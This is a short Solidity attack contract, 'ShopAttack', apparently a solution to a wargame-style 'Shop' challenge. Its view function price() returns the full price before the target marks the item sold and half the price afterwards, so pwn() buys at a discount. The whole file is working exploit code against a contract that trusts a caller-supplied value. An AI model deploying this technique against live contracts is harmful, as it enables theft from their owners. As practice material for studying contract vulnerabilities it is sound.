// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);

    function price() external view returns (uint256);
}

contract ShopAttack {
    IShop public target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function pwn() external {
        target.buy();
    }

    // Invoked with staticcall, not allowed modifying state
    function price() external view returns (uint256) {
        if (!target.isSold()) {
            return target.price();
        } else {
            return target.price() / 2;
        }
    }
}
